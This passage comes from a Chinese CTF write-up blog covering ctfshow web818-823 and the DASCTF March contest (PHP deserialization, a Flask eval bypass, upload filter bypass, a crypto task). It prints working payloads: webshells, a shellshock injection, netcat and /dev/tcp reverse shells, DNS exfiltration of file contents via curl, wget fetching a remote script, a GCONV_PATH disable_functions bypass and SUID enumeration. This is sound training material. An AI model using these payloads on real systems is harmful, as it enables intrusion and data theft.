&#x2F;?file&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125; HTTP&#x2F;1.1 Host: 127.0.0.1 Connection: close &#39;&#39;&#39;.encode()) print(s.recv(2048).decode()) s.close() for i in range(30): t &#x3D; threading.Thread(target&#x3D;upload) t.start() for j in range(30): a &#x3D; threading.Thread(target&#x3D;bruter) a.start() （好卡啊 web818$env &#x3D; $_GET[&#39;env&#39;]; if(isset($env))&#123; putenv($env); system(&quot;echo ctfshow&quot;); &#125;else&#123; system(&quot;ps aux&quot;); &#125; ··· 和817一样的原理，只不过把要传入的东西变成了恶意so文件 恶意文件用816那个就可以 （卡卡卡卡卡 web819&lt;?php $env &#x3D; $_GET[&#39;env&#39;]; if(isset($env))&#123; putenv($env); system(&quot;whoami&quot;); &#125;else&#123; highlight_file(__FILE__); &#125; 没有 ps aux 来显示所有进程，要靠爆破pid显然不太显示 这里我们利用另一种漏洞。 破壳漏洞 感觉这就类似php的create_function函数的命令逃逸一样，利用结束符让这个函数提前结束然后在后面加上我们自己的命令 这里因为后边执行了whoami命令，我们就直接利用putenv修改whoami命令就行。 最终payload env&#x3D;BASH_FUNC_whoami%%&#x3D;() &#123; cat &#x2F;f*; &#125; web820非常规的文件上传 upload.php &lt;?php error_reporting(0); if(strlen($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])&gt;0)&#123; $filetype &#x3D; $_FILES[&#39;file&#39;][&#39;type&#39;]; $tmpname &#x3D; $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]; $ef &#x3D; getimagesize($tmpname); if( ($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;) &amp;&amp; ($ef!&#x3D;false) &amp;&amp; ($ef[&#39;mime&#39;]&#x3D;&#x3D;&#39;image&#x2F;jpeg&#39;))&#123; $content &#x3D; base64_decode(file_get_contents($tmpname)); file_put_contents(&quot;shell.php&quot;, $content); echo &quot;file upload success!&quot;; &#125; &#125;else&#123; highlight_file(__FILE__); &#125; 上传的文件内容被base64解码一次后再放进shell.php，而base64遇到不属于自己编码字符内的字符时会跳过，可以利用这个特性构造一个特殊的图片 群主构造的图片 里面的字符被base64解码后为 &lt;?&#x3D;&#96;$_GET[1]&#96;;;?&gt;? 也就是一个get型的一句话木马，参数是1 web821七字符可写 源码 error_reporting(0); highlight_file(__FILE__); $cmd &#x3D; $_POST[&#39;cmd&#39;]; if(strlen($cmd) &lt;&#x3D; 7)&#123; shell_exec($cmd); &#125; 直接上群主师傅的脚本就行了 import requests import time url &#x3D; &quot;http:&#x2F;&#x2F;ed9441a5-6e27-43b0-8538-bdd2f5a5b4d2.challenge.ctf.show&#x2F;&quot; payload&#x3D;[ &quot;&gt;hp&quot;, &quot;&gt;1.p\\\\&quot;, &quot;&gt;d\\\\&gt;\\\\&quot;, &quot;&gt;\\\\ -\\\\&quot;, &quot;&gt;e64\\\\&quot;, &quot;&gt;bas\\\\&quot;, &quot;&gt;7\\\\|\\\\&quot;, &quot;&gt;XSk\\\\&quot;, &quot;&gt;Fsx\\\\&quot;, &quot;&gt;dFV\\\\&quot;, &quot;&gt;kX0\\\\&quot;, &quot;&gt;bCg\\\\&quot;, &quot;&gt;XZh\\\\&quot;, &quot;&gt;AgZ\\\\&quot;, &quot;&gt;waH\\\\&quot;, &quot;&gt;PD9\\\\&quot;, &quot;&gt;o\\\\ \\\\&quot;, &quot;&gt;ech\\\\&quot;, &quot;ls -t&gt;0&quot;, &quot;. 0&quot; ] def writeFile(payload): data&#x3D;&#123; &quot;cmd&quot;:payload &#125; requests.post(url,data&#x3D;data) def run(): for p in payload: writeFile(p.strip()) print(&quot;[*] create &quot;+p.strip()) time.sleep(1) def check(): response &#x3D; requests.get(url+&quot;1.php&quot;) if response.status_code &#x3D;&#x3D; requests.codes.ok: print(&quot;[*] Attack success!!!Webshell is &quot;+url+&quot;1.php&quot;) def main(): run() check() if __name__ &#x3D;&#x3D; &#39;__main__&#39;: main() 这个主要就是将一个get型的一句话木马，参数是1，写进了1.php 原理就是Linux中&gt;x可以生成一个文件名为x的文件 而. x又能执行shell命令 所以利用ls -t对文件按照时间进行排序之后存入0文件，再利用. 0来执行这些文件名构成的命令 题目提示flag在数据库里，用蚁剑连接 get转post 数据操作，然后弱口令登录 web822七字符不可写 和821一样的代码，但是没有了写入权限，这时候我们就要想利用临时文件了，比如/t*/* import requests import time url &#x3D; &quot;http:&#x2F;&#x2F;a7276db0-6191-44d2-bbf9-c992009366b4.challenge.ctf.show&#x2F;&quot; def getShell(payload): data&#x3D;&#123; &quot;cmd&quot;:payload &#125; file &#x3D; &#123; &quot;file&quot;:b&quot;#!&#x2F;bin&#x2F;sh\\nnc ip 5001 -e &#x2F;bin&#x2F;sh&quot; &#125; requests.post(url,data&#x3D;data,files&#x3D;file) print(&quot;[*] Attack success!!!&quot;) def run(): getShell(&quot;. &#x2F;t*&#x2F;*&quot;) def main(): run() if __name__ &#x3D;&#x3D; &#39;__main__&#39;: main() 反弹shell web8235字符可写，有dir 很厉害的思路，把index.php改写成.index 还是有群主的脚本","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"dasctf三月赛复现","slug":"dasctf三月赛复现","date":"2022-03-30T05:43:48.000Z","updated":"2022-04-08T02:27:17.240Z","comments":true,"path":"2022/03/30/dasctf三月赛复现/","link":"","permalink":"https://ethe448.github.io/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"WEB感觉这次的题不是很难，不至于像之前那样复现都复现不了，不过自己还是太菜了，web只出了一个，这里主要是复现一下web方面 ezpop确实是一个简单的php &lt;?php class crow &#123; public $v1; public $v2; function eval() &#123; echo new $this-&gt;v1($this-&gt;v2); &#125; public function __invoke() &#123; $this-&gt;v1-&gt;world(); &#125; &#125; class fin &#123; public $f1; public function __destruct()&#x2F;&#x2F;反序列化的入口 &#123; echo $this-&gt;f1 . &#39;114514&#39;; &#125; public function run() &#123; ($this-&gt;f1)(); &#125; public function __call($a, $b) &#123; echo $this-&gt;f1-&gt;get_flag(); &#125; &#125; class what &#123; public $a; public function __toString() &#123; $this-&gt;a-&gt;run(); return &#39;hello&#39;; &#125; &#125; class mix &#123; public $m1; public function run() &#123; ($this-&gt;m1)(); &#125; public function get_flag() &#123; eval(&#39;#&#39; . $this-&gt;m1); &#125; &#125; if (isset($_POST[&#39;cmd&#39;])) &#123; unserialize($_POST[&#39;cmd&#39;]); &#125; else &#123; highlight_file(__FILE__); &#125; 完整的反序列化链为 fin::destruct-&gt;what::tostring-&gt;mix::run-&gt;crow::invoke-&gt;fin::call-&gt;mix:get_flag 在get_flag函数里可以利用换行符来防止自己的命令被其中的井号注释，达到命令执行的目的 class crow &#123; public $v1; public $v2; &#125; class fin &#123; public $f1; &#125; class what &#123; public $a; &#125; class mix &#123; public $m1; public function get_flag() &#123; eval(&#39;#&#39; . $this-&gt;m1); &#125; &#125; $a &#x3D; new fin(); $a -&gt;f1 &#x3D; new what(); $a -&gt;f1-&gt;a &#x3D; new mix(); $a -&gt;f1-&gt;a-&gt;m1 &#x3D; new crow(); $a -&gt;f1-&gt;a-&gt;m1-&gt;v1 &#x3D; new fin(); $a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1 &#x3D; new mix(); $a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1 &#x3D; &quot;%0a;system(&#39;ls&#39;);&quot;; echo serialize($a); &#x2F;&#x2F;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:17:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125; 因为我这里是用的%0a，应该是解析的时候把它变成了\\n，所以这个值的长度其实是要比反序列化出的长度要少1 最终payload： O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:16:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125; 然后cat读文件 O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:162:&quot;%0a;system(&#39;cat H0mvz850A.php H0mvz850B.php H0mvz850C.php H0mvz850D.php H0mvz850E.php H0mvz850F.php H0mvz850G.php H0mvz850q.php H0mvz850z.php flag.php index.php&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125; calcapp.py #coding&#x3D;utf-8 from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory import random from urllib import parse import os from werkzeug.utils import secure_filename import time app&#x3D;Flask(__name__) def waf(s): blacklist &#x3D; [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;] flag &#x3D; True for no in blacklist: if no.lower() in s.lower(): flag&#x3D; False print(no) break return flag @app.route(&quot;&#x2F;&quot;) def index(): &quot;欢迎来到SUctf2022&quot; return render_template(&quot;index.html&quot;) @app.route(&quot;&#x2F;calc&quot;,methods&#x3D;[&#39;GET&#39;]) def calc(): ip &#x3D; request.remote_addr num &#x3D; request.values.get(&quot;num&quot;) log &#x3D; &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; .&#x2F;tmp&#x2F;log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num) if waf(num): try: data &#x3D; eval(num) os.system(log) except: pass return str(data) else: return &quot;waf!!&quot; if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;5000) 对输入的内容先当作python语句执行，然后再执行log 比赛的时候想的是绕过然后ssti注入，但是过滤的实在太多了 所以只能放弃ssti来想对os.system的利用 因为log = &quot;echo {0} {1} {2}&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num) 也就是说它会把这些内容输出存到log.txt里 本地尝试一下可以发现，如果echo 里用反引号加命令是可以执行的，而执行的结果会输入到log.txt中 但是如果我们直接将 num&#x3D;&#96;ls&#96; 输入，就会导致前边的eval函数报错，也就不会执行后面的system了。所以这时候我们就要利用井号来进行注释 #再python中作为注释符来使用，但是在Linux中只有在句首的位置才能当作注释 我们可以利用这个特性来实现对eval的绕过 #将后边的值都注释了，也就不会让eval报错了 而对于Linux 既然井号可以绕过eval来执行我们的命令，那我们再试试能不能利用通配符直接读flag（这里其实应该先外带log.txt的内容看flag在的文件名的，但是复现的时候忘了 http:&#x2F;&#x2F;95b2c2f7-fe16-46a0-bdf8-81f18ab7b14e.node4.buuoj.cn:81&#x2F;calc?num&#x3D;7%23&#96;curl%09\\&#96;cat%09*1*\\&#96;.locsor.dnslog.cn&#96; 成功了 但是显然因为dnslog一次只能带一条信息，而|又被ban掉了，不能利用sed来看其他的文件，所以猜到flag的难度很大，所以我们可以用wget来让靶机反弹shell 1.sh就是一个正常的反弹shell的语句 &#x2F;calc?num&#x3D;7%23&#96;wget%09-P%09&#x2F;var%09http:&#x2F;&#x2F;ip&#x2F;1.sh&#96; 给一个可执行权限 &#x2F;calc?num&#x3D;7*7%23&#96;chmod%09777%09&#x2F;var&#x2F;1.sh&#96; 然后执行 &#x2F;calc?num&#x3D;7*7%23&#96;&#x2F;var&#x2F;1.sh&#96; 拿到flag，和dnslog外带的结果一样 upgdstore只能传php，但是传php又会被过滤 这里把Content-Type改成image/jpeg就能绕过 eval应该是被过滤了，传马传不上去，可以先传个phpinfo()看看 第一次见这么多的disable_functions 但是show_source，file_get_contents没被ban，可以用这个读取源码 &lt;?php (&#39;sho&#39;.&#39;w_source&#39;)(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;);&#x2F;&#x2F;这里拼接绕过是因为这个函数是被放了黑名单里了 ?&gt; index.php HTTP&#x2F;1.1 200 OK Server: openresty Date: Sat, 26 Mar 2022 09:01:18 GMT Content-Type: text&#x2F;html; charset&#x3D;UTF-8 Content-Length: 1695 Connection: close Vary: Accept-Encoding &lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt; &lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt; 嘿伙计，传个火？！ &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt; &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt; &lt;?php function fun($var): bool&#123; $blacklist &#x3D; [&quot;\\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;&#96;&quot;,&quot;chmod&quot;]; foreach($blacklist as $blackword)&#123; if(strstr($var, $blackword)) return True;&#x2F;&#x2F;strstr大小写敏感，所以可以用大写绕过这个黑名单 &#125; return False; &#125; error_reporting(0); &#x2F;&#x2F;设置上传目录 define(&quot;UPLOAD_PATH&quot;, &quot;.&#x2F;uploads&quot;); $msg &#x3D; &quot;Upload Success!&quot;; if (isset($_POST[&#39;submit&#39;])) &#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION); if(!preg_match(&quot;&#x2F;php&#x2F;i&quot;, strtolower($ext)))&#123; die(&quot;只要好看的php&quot;); &#125; $content &#x3D; file_get_contents($temp_file); if(fun($content))&#123; die(&quot;诶，被我发现了吧&quot;); &#125; $new_file_name &#x3D; md5($file_name).&quot;.&quot;.$ext; $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name; if (move_uploaded_file($temp_file, $img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &#39;Upload Failed!&#39;; die(); &#125; echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;; &#125; 既然要绕过disable_functions,我们就要想到利用so文件 使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客 但是在so文件中有些符号会被这个文件上传页面的黑名单过滤 所以这里我们要采用自己写一个文件上传的无黑名单的页面来绕过 1.php PGRpdiBjbGFzcz0ibGlnaHQiPjxzcGFuIGNsYXNzPSJnbG93Ij4KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0IiBvbnN1Ym1pdD0icmV0dXJuIGNoZWNrRmlsZSgpIj4KICAgIOWYv+S8meiuoe+8jOS8oOS4queBq++8n++8gQogICAgPGlucHV0IGNsYXNzPSJpbnB1dF9maWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJ1cGxvYWRfZmlsZSIvPgogICAgPGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIi8+CjwvZm9ybT4KPC9zcGFuPjxzcGFuIGNsYXNzPSJmbGFyZSI+PC9zcGFuPjxkaXY+Cjw&#x2F;cGhwCmVycm9yX3JlcG9ydGluZygwKTsKLy&#x2F;orr7nva7kuIrkvKDnm67lvZUKZGVmaW5lKCJVUExPQURfUEFUSCIsICIvdG1wIik7CiRtc2cgPSAiVXBsb2FkIFN1Y2Nlc3MhIjsKaWYgKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7CiR0ZW1wX2ZpbGUgPSAkX0ZJTEVTWyd1cGxvYWRfZmlsZSddWyd0bXBfbmFtZSddOwokZmlsZV9uYW1lID0gJF9GSUxFU1sndXBsb2FkX2ZpbGUnXVsnbmFtZSddOwokZXh0ID0gcGF0aGluZm8oJGZpbGVfbmFtZSxQQVRISU5GT19FWFRFTlNJT04pOwovL3h4eHh4CiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJHRlbXBfZmlsZSk7CgokbmV3X2ZpbGVfbmFtZSA9ICRmaWxlX25hbWU7CiAgICAgICAgJGltZ19wYXRoID0gVVBMT0FEX1BBVEggLiAnLycgLiAkbmV3X2ZpbGVfbmFtZTsKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCR0ZW1wX2ZpbGUsICRpbWdfcGF0aCkpewogICAgICAgICAgICAkaXNfdXBsb2FkID0gdHJ1ZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbXNnID0gJ1VwbG9hZCBGYWlsZWQhJzsKICAgICAgICAgICAgZGllKCk7CiAgICAgICAgfQogICAgICAgIGVjaG8gJzxkaXYgc3R5bGU9ImNvbG9yOiNGMDAiPicuJG1zZy4iIExvb2sgaGVyZX4gIi4kaW1nX3BhdGguIjwvZGl2PiI7Cn0K base64解码后实际的内容 &lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt; &lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt; 嘿伙计，传个火？！ &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt; &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt; &lt;?php error_reporting(0); &#x2F;&#x2F;设置上传目录 define(&quot;UPLOAD_PATH&quot;, &quot;&#x2F;tmp&quot;); $msg &#x3D; &quot;Upload Success!&quot;; if (isset($_POST[&#39;submit&#39;])) &#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION); &#x2F;&#x2F;xxxxx $content &#x3D; file_get_contents($temp_file); $new_file_name &#x3D; $file_name; $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name; if (move_uploaded_file($temp_file, $img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &#39;Upload Failed!&#39;; die(); &#125; echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;; &#125; 同时我们还要串一个一句话木马来包含这个文件，使这段base64加密的东西可以被解析 &lt;?php Eval(base64_decode(&#39;ZXZhbCgkX1BPU1RbJ2EnXSk&#x3D;&#39;).&#39;;&#39;);&#x2F;&#x2F;注意eval里的分号是要拼接上去，而不是直接加上 ?&gt; //实际上这里做题的时候经常报错，但是用get方法取值就没问题,所以我下面都用的get的一句话木马 再利用include和php://filter来让之前我们写的页面的代码执行 a&#x3D;include(base64_decode(&#39;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT05YmMwOWVlNGUwZWI5MTg0MGY3YzUyMDdlMWQ4NDg1Mi5waHA&#x3D;&#39;)); 里面这段base64加密的内容是 php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;9bc09ee4e0eb91840f7c5207e1d84852.php 现在我们就可以根据使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客 这篇文章里的东西进行提交了 首先是gconv-modules文件 module 自定义字符集名字（大写）&#x2F;&#x2F; INTERNAL ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写） 2 module INTERNAL 自定义字符集名字（大写）&#x2F;&#x2F; ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写） 2 根据题目我们可以改成aa module A&#x2F;&#x2F; INTERNAL ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a 2 module INTERNAL A&#x2F;&#x2F; ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a 2 然后是so文件 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void gconv() &#123;&#125; void gconv_init() &#123; system(&quot;希望执行的命令&quot;); &#125; 我们可以写成 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void gconv() &#123;&#125; void gconv_init() &#123; system(&quot;bash -c &#39;exec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39;&quot;); &#125; 然后编译 gcc 源代码文件名.c -o 自定义字符集名.so -shared -fPIC 上传 然后书写shell.php &lt;?php putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;); iconv(&quot;自定义字符集名&quot;, &quot;UTF-8&quot;, &quot;whatever&quot;); ?&gt; 我们就直接传参 a&#x3D;putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);include(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.a.utf-8&#x2F;resource&#x3D;&#x2F;tmp&#x2F;a.so&#39;); shell弹出来了 但是要访问flag文件权限不够 suid提权Linux提权-suid提权 - 走看看 (zoukankan.com) find / -user root -perm -4000 -print 2&gt;/dev/null 这步不知道为什么我没有复现成功，只输出了三个值就卡住了 但是可以用别的命令看看 find &#x2F;bin -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null find &#x2F;usr -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 最后就是看到nl有权限，用nl读取flag就行 MISC月圆之夜 我破译了神级彩蛋！这款游戏竟然藏了这么多剧情？《月圆之夜》究竟讲了什么故事？_单机游戏热门视频 (bilibili.com) B站有解密的，对着找就行 CRYPTOFlowerCipher# python3 from secret import flag import random # flag &#x3D; b&#39;flag&#123;%s&#125;&#39; % md5(something).hexdigest() # note that md5 only have characters &#39;abcdef&#39; and digits def Flower(x, key): flower &#x3D; random.randint(0, 4096) return x * (key ** 3 + flower) flag &#x3D; flag[5:-1] rounds &#x3D; len(flag) L, R &#x3D; 1, 0 for i in range(rounds): L, R &#x3D; R + Flower(L, flag[i]), L print(L, R) &#39;&#39;&#39; 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003 &#39;&#39;&#39; 加密方式就是把flag的字符转成md5然后再转成ascii码后套在Flower函数里计算，然后对RL重新赋值，这样的R其实就 是前一个L的值，而实际上L = 上一个R + 上一个L乘上(key ** 3 + flower)， 显然 L1 * (key ** 3 + flower)是能被L1整除的，而R1不行 所以L2/L1的余数就是L2 这样我们可以得到所有的L和R R &#x3D; &#123;0: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 1: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 2: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 3: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 4: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 5: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 6: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 7: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 8: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 9: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 10: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 11: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 12: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 13: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 14: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 15: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 16: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 17: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 18: 241267801518963217329803327254141129383508497053892152707957403620167975, 19: 240324048977128823416619126180138745528644638124733113619292984561, 20: 1501209023627137765492979001172871435243212151481455508796928, 21: 11731219952144596819377276074864534430521345582519171825, 22: 11050144307727113700681557772687121323224647867153, 23: 10722465754210488857842384539746544074196670, 24: 67952303343509961405922862120527631953, 25: 424678007756192434300006917804988, 26: 449366186013055209469307061, 27: 2694478038943586736328, 28: 24316418691677517, 29: 137492755075, 30: 133317, 31: 1, 32: 0&#125; L &#x3D; &#123;0: 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899, 1: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 2: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 3: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 4: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 5: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 6: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 7: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 8: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 9: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 10: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 11: 